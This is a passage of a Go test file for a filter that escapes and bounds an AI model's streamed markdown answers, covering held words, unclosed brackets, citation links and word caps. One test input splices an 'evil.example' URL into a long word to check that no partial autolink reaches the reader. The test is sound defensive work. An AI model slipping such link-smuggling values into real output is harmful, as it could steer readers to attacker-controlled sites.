			emitted.terminal(t)
		})
	}
}

// TestFilterBoundsTheTextItHolds: a word with no whitespace after it, and a [ the model never
// closed, are each held to a bound of their own - the word to heldWordMax, the span to
// heldByteMax - so no delta re-scans without end and a reader is never left waiting on text the
// model has already written. The two bounds end differently, and must: the span is decided as
// the ordinary text it turned out to be, while the word is dropped whole, because the escape is
// no answer to a literal autolink and the half of a word a bound kept would be a link to a
// renderer wherever GFM would link that half. The rest of the word is dropped with it and
// counted once, and the words after it still reach the reader.
func TestFilterBoundsTheTextItHolds(t *testing.T) {
	const tail = " and the rest of it."
	for _, tc := range []struct {
		name    string
		delta   string
		want    string
		dropped int
	}{
		{"a word longer than the bound", strings.Repeat("a", 200_001) + tail, escaped(tail), 1},
		{"a bracket the model never closed", "[" + strings.Repeat("a", 200_001) + tail, escaped(tail), 1},
		{"a scheme the bound falls inside of", "https" + strings.Repeat("a", 200_001) + "://evil.example" + tail, escaped(tail), 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			emitted := &stream{}
			filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
			for i, delta := range pieces(tc.delta, 7) {
				if err := filter.Write(delta); err != nil {
					t.Fatalf("Write(%d): %v", i, err)
				}
				if held := len(filter.pending); held >= heldByteMax {
					t.Fatalf("after delta %d the filter holds %d undecided bytes, want fewer than the bound of %d", i, held, heldByteMax)
				}
				if held := len(filter.word); held >= heldWordMax {
					t.Fatalf("after delta %d the filter holds a word of %d bytes, want fewer than the bound of %d", i, held, heldWordMax)
				}
				if held := emitted.text(); !strings.HasPrefix(tc.want, held) {
					// Half of the word the bound cut would be here, and a renderer links a
					// half as readily as a whole.
					t.Fatalf("after delta %d the reader has seen %q, want a start of %q", i, held[:min(len(held), 40)], tc.want)
				}
			}
			if len(emitted.events) == 0 {
				t.Errorf("the reader was told nothing of the %d bytes the model wrote before Close", len(tc.delta))
			}
			if err := filter.Close(); err != nil {
				t.Fatalf("Close: %v", err)
			}
			got := emitted.text()
			plainText(t, got)
			if got != tc.want {
				t.Errorf("answer = %q, want %q", got, tc.want)
			}
			if dropped := emitted.dropped(t); dropped != tc.dropped {
				t.Errorf("changed dropped = %d, want %d: the word the bound cut is one drop, and the rest of it is none",
					dropped, tc.dropped)
			}
			noAutolink(t, got)
			emitted.terminal(t)
		})
	}
}

// TestFilterDropsAHeldLinkTheCutWouldSplit: the cap falls inside a link's own text, so the
// answer ends at the cap, the item is never named - a link whose text a reader was not shown
// cites nothing for them - and the drop is the cut's doing: it raises no changed.
func TestFilterDropsAHeldLinkTheCutWouldSplit(t *testing.T) {
	answer := words(contracts.GoingAnswerWordMax-1) + " [Answer a question](/issues/INFRA-1279) and more words after it."
	emitted := drive(t, citationsOf(citedIssue), pieces(answer, 9)...)
	got := emitted.text()
	plainText(t, got)
	if strings.Contains(got, citedIssue.Href) || strings.ContainsAny(got, "[]()") {
		t.Errorf("answer = %q, want no part of the link the cut split", got)
	}
	if count := len(strings.Fields(got)); count != contracts.GoingAnswerWordMax {
		t.Errorf("answer carries %d words, want the %d the cap allows", count, contracts.GoingAnswerWordMax)
	}
	if words := emitted.only(t, contracts.GoingEventCut).Data.(CutData).Words; words != contracts.GoingAnswerWordMax {
		t.Errorf("cut words = %d, want %d", words, contracts.GoingAnswerWordMax)
	}
	if got := emitted.count(contracts.GoingEventChanged); got != 0 {
		t.Errorf("stream holds %d changed events, want none: the cut ended that link, not the citation set", got)
	}
	if got := emitted.count(contracts.GoingEventItem); got != 0 {
		t.Errorf("stream holds %d item events, want none for a link the reader was not shown", got)
	}
	emitted.terminal(t)
}

// TestFilterDropsAHeldWordTheCutWouldSplit: the cap falls at a word still being written, so the
// answer ends at the word before it and no half word is emitted.
func TestFilterDropsAHeldWordTheCutWouldSplit(t *testing.T) {
	emitted := &stream{}
	filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
	if err := filter.Write(words(contracts.GoingAnswerWordMax) + " halfaw"); err != nil {
		t.Fatalf("Write: %v", err)
	}
	if err := filter.Write("ord and the rest."); err != nil {
		t.Fatalf("second Write: %v", err)
	}
	if err := filter.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	if got := emitted.text(); strings.Contains(got, "halfaw") {
		t.Errorf("answer = %q, want no half of the word the cut fell at", got[max(0, len(got)-40):])
	}
	if got := len(strings.Fields(emitted.text())); got != contracts.GoingAnswerWordMax {
		t.Errorf("answer carries %d words, want %d", got, contracts.GoingAnswerWordMax)
	}
	if words := emitted.only(t, contracts.GoingEventCut).Data.(CutData).Words; words != contracts.GoingAnswerWordMax {
		t.Errorf("cut words = %d, want %d", words, contracts.GoingAnswerWordMax)
	}
}

// TestFilterEmitsASpanThatIsNoLink: a span resolved as no link at all is emitted as the text it
// is - a ] no target follows, a newline inside the span, a span the model never closed - and
// escaped like every other byte, so the brackets the model wrote reach the reader as brackets
// and link nothing.
func TestFilterEmitsASpanThatIsNoLink(t *testing.T) {
	for _, tc := range []struct {
		name   string
		answer string
		want   string
		items  int
	}{
		{"a bracket no target follows", "The order is [not a link] here.", escaped("The order is [not a link] here."), 0},
		{"a newline inside the span", "The order is [not\na link either.", escaped("The order is [not\na link either."), 0},
		{"a newline inside the target", "The order is [a](/issues/\nINFRA-1279) here.", escaped("The order is [a](/issues/\nINFRA-1279) here."), 0},
		{"a link inside an unclosed bracket", "The order is [one [two](/issues/INFRA-1279) here.", escaped("The order is [one two here."), 1},
		{"a span still held at the end", "The order is [unterminated", escaped("The order is [unterminated"), 0},
		{"a target still held at the end", "The order is [a](/issues/INFRA-1279", escaped("The order is [a](/issues/INFRA-1279"), 0},
	} {
		t.Run(tc.name, func(t *testing.T) {
			emitted := drive(t, citationsOf(citedIssue), pieces(tc.answer, 4)...)
			got := emitted.text()
			if got != tc.want {
				t.Errorf("answer = %q, want %q", got, tc.want)
			}
			plainText(t, got)
			if items := emitted.count(contracts.GoingEventItem); items != tc.items {
				t.Errorf("stream holds %d item events, want %d: %v", items, tc.items, emitted.names())
			}
			if got := emitted.count(contracts.GoingEventChanged); got != 0 {
				t.Errorf("stream holds %d changed events, want none for a span that was no link", got)
			}
			emitted.terminal(t)
		})
	}
}

// TestFilterHandsTheWritersFailureToItsCaller: the stream's writer has failed, so the filter
// stops where it failed and hands that error back. It keeps no copy of the failure of its own:
// the run holds that the writer failed, and one copy of that state is all there is to keep true.
func TestFilterHandsTheWritersFailureToItsCaller(t *testing.T) {
	t.Run("the text before an item", func(t *testing.T) {
		emitted := &stream{failAt: 1}
		filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
		err := filter.Write("See [Answer a question](/issues/INFRA-1279) and more. ")
		if !errors.Is(err, emitted.fault) {
			t.Fatalf("Write error = %v, want the writer's own failure %v", err, emitted.fault)
		}
		if len(emitted.events) != 1 {
			t.Errorf("stream holds %d events, want the one the writer failed at: %v", len(emitted.events), emitted.names())
		}
	})
	t.Run("an event of Close's own", func(t *testing.T) {
		emitted := &stream{failAt: 2}
		filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
		if err := filter.Write("Dispatch holds nothing about that. "); err != nil {
			t.Fatalf("Write: %v", err)
		}
		if err := filter.Close(); !errors.Is(err, emitted.fault) {
			t.Fatalf("Close error = %v, want the writer's own failure %v", err, emitted.fault)
		}
		if got, want := emitted.names(), []string{contracts.GoingEventText, contracts.GoingEventEnd}; strings.Join(got, ",") != strings.Join(want, ",") {
			t.Errorf("events = %v, want %v", got, want)
		}
	})
}

// TestFilterCountsTheWordsStringsFieldsCounts: the count the cut and the end carry is
// strings.Fields over everything the reader saw, however the deltas split its words. An escape
// adds no space, so the words the server counts are the words the reader reads.
func TestFilterCountsTheWordsStringsFieldsCounts(t *testing.T) {
	for _, size := range []int{1, 3, 7, 1000} {
		answer := "Dispatch keeps the broadcast order on [Answer a question](/issues/INFRA-1279) itself, not on the comment."
		emitted := drive(t, citationsOf(citedIssue), pieces(answer, size)...)
		want := len(strings.Fields(emitted.text()))
		if got := emitted.terminal(t).Data.(EndData).Words; got != want {
			t.Errorf("deltas of %d bytes: end words = %d, want strings.Fields' own %d", size, got, want)
		}
	}
}
